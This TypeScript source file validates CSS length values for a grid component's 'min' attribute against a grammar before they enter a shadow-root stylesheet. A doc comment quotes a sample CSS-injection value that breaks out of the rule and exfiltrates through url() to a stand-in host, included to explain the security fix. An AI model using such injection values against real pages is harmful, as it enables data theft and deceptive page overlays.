/** A number with a length unit, or a bare number inside a function. */
const NUMBER =
  /^-?(?:\d+\.?\d*|\.\d+)(?:px|r?em|r?ex|r?ch|r?lh|r?ic|r?cap|%|[sdl]?v(?:w|h|i|b|min|max)|cq(?:w|h|i|b|min|max)|cm|mm|in|pt|pc|q)?$/i

/** What `min` may be built from, one token at a time. */
const TOKEN = /\s+|(?:calc|clamp|min|max)\(|var\(--[\w-]+|-?(?:\d+\.?\d*|\.\d+)[a-z%]*|[(),+*/-]/giy

/**
 * A grid's `min` as a length a rule may hold, or `undefined` where it is not
 * one.
 *
 * **Checked against a grammar before it reaches a stylesheet, and that is a
 * security fix rather than tidiness.** It is a public attribute written into a
 * `<style>` element's text, so an unchecked
 * `min="1px,1fr)} :host{background:url(//elsewhere/?stolen)} @media all{"`
 * closed the rule and wrote arbitrary CSS into the grid's shadow root,
 * enough to exfiltrate through `url()` and to lay an invisible plate over the
 * page. `createSheet` says in its own documentation that consumer input must
 * not be interpolated into CSS. A grammar rather than an escape: a length is
 * numbers, units, four math functions, `var()`, operators and balanced
 * parentheses, and nothing in it can end a declaration.
 */
export const gridLength = (value: string | undefined): string | undefined => {
  const min = value?.trim() ?? ''
  if (min === '' || min.includes('/*')) {
    return undefined
  }
  if (!min.includes('(')) {
    return NUMBER.test(min) && /[a-z%]$/i.test(min) ? min : undefined
  }
  let depth = 0
  TOKEN.lastIndex = 0
  while (TOKEN.lastIndex < min.length) {
    const at = TOKEN.lastIndex
    const token = TOKEN.exec(min)?.[0]
    if (token === undefined || TOKEN.lastIndex === at) {
      return undefined
    }
    if (/\d/.test(token) && /^-?[\d.]/.test(token) && !NUMBER.test(token)) {
      return undefined
    }
    depth += token.endsWith('(') || token.startsWith('var(') ? 1 : token === ')' ? -1 : 0
    if (depth < 0) {
      return undefined
    }
  }
  return depth === 0 ? min : undefined
}

/**
 * The track list a grid's `min` or `columns` asks for beyond the ones its
 * stylesheet lists, or `undefined` where it asks for none.
 *
 * `min` fits as many equal columns as its width allows, and wins over
 * `columns`. The stylesheet lists one to six equal columns, so a count only
 * reaches here above six.
 */
export const gridTracks = (min: unknown, columns: unknown): string | undefined => {
  const length = gridLength(typeof min === 'string' ? min : undefined)
  if (length !== undefined) {
    return `repeat(auto-fit, minmax(min(${length}, 100%), 1fr))`
  }
  const count = Number(columns)
  return Number.isInteger(count) && count > 6 ? `repeat(${count}, minmax(0, 1fr))` : undefined
}
